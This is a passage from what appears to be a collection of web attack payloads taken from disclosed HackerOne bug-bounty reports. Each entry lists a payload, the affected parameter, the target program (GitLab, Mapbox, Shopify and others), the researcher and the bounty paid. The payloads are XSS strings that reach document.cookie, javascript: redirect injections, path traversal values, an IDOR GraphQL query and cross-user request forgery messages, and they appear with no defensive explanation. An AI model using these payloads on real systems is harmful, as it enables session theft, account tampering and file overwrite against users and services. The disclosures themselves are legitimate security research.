{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) {\n  mlModel(id: $id) {\n    
```

**Parameter:** `variables.id`
— [IDOR Exposes All Machine Learning Models](https://hackerone.com/reports/2528293) · GitLab · [moblig](https://hackerone.com/moblig) · $1,160.0

### `61f62d7a`

```
https://localhost/-/jira_connect/users?return_to=javascript:alert(location)
```

**Parameter:** `return_to`
— [XSS by clicking Jira's link](https://hackerone.com/reports/1194254) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q) · $1,130.0

### `07dcbe11`

```
https://target.com//x:1/:///%01javascript:alert(document.cookie)/
```

— [\[target.com\] XSS and Open Redirect](https://hackerone.com/reports/260744) · X / xAI · [bobrov](https://hackerone.com/bobrov) · $1,120.0

### `6c627186`

```
https://target.com/web/sign-inhttps://target.com/javascript:alert(1
```

— [\[target.com\] XSS and Open Redirect Protection Bypass](https://hackerone.com/reports/330008) · X / xAI · [bywalks](https://hackerone.com/bywalks) · $1,120.0

### `1333560a`

```
{"type":"form-update","element":"#algo-id","value":"/../../../../../users/user?prefs%5Bsend_login_detected_email%5D=false","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}
```

**Parameter:** `value`
— [Ability to perform various POST requests on target.com as a different user - insecure by design.](https://hackerone.com/reports/837328) · Quantopian · [irisrumtub](https://hackerone.com/irisrumtub) · $1,050.0

### `640c9115`

```
{"type":"form-update","element":"#algo-id","value":"/../../../../../users/user?firstname=h1&lastname=test&bio=hi#","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}
```

**Parameter:** `value`
— [Ability to perform various POST requests on target.com as a different user - insecure by design.](https://hackerone.com/reports/837328) · Quantopian · [irisrumtub](https://hackerone.com/irisrumtub) · $1,050.0

### `ba92d1a4`

```
{meme, src= http://dummy//onerror=eval(prompt(1))// }
```

— [XSS in editor by any user](https://hackerone.com/reports/18691) · Phabricator · [tunnelshade](https://hackerone.com/tunnelshade) · $1,000.0

### `685e9ab6`

```
"><img src="x onerror=alert(document.cookie)>
```

— [Persistent cross-site scripting (XSS) in map attribution](https://hackerone.com/reports/54327) · Mapbox · [ph3t](https://hackerone.com/ph3t) · $1,000.0

### `9dddf33a`

```
"'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"
```

— [XSS in L.mapbox.shareControl in mapbox.js](https://hackerone.com/reports/99245) · Mapbox · [enderun07](https://hackerone.com/enderun07) · $1,000.0

### `938e3da0`

```
<img src=a >\"><iframe onload=alert('XSS')>
```

— [XSS in L.mapbox.shareControl in mapbox.js](https://hackerone.com/reports/99245) · Mapbox · [enderun07](https://hackerone.com/enderun07) · $1,000.0

### `ab3b40fd`

```
'-alert(document.domain)-'
```

**Parameter:** `value`
— [XSS in $shop$.target.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app](https://hackerone.com/reports/217790) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $1,000.0

### `7bf2a0a4`

```
†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
```

— [Stored XSS in profile activity feed messages](https://hackerone.com/reports/231444) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,000.0

### `c434c0d5`

```
../../../../../any/where
```

**Parameter:** `name`
— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0
